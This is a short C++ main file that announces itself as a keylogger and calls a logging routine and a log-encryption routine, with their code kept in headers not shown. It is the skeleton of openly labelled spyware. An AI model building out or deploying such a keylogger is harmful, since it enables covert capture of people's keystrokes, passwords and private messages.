#include <iostream>
#include "logger.h"
#include "encryptor.h"

int main() {
    std::cout << "Keylogger Started..." << std::endl;

    // Start logging
    startLogger();

    // Encrypt logs periodically (can be set with a timer)
    encryptLog();

    return 0;
}
